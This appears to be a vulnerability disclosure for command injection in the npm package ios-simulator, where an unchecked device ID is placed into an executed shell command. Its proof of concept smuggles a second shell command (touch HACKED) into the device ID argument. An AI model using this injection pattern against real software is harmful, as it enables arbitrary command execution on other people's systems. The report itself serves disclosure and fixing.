The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js

var ios = require('ios-simulator');

ios.prototype.setDeviceId('test"; touch HACKED; #');

ios.prototype.install();
```
2. Check there aren't files called `HACKED`

3. Execute the following commands in another terminal:

```bash

npm i ios-simulator # Install affected module

node poc.js #  Run the PoC

```
4. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/macacajs/ios-simulator/issues/15)
 - [Issue Permalink](https://github.com/macacajs/ios-simulator/blob/master/lib/ios-simulator.js#L50)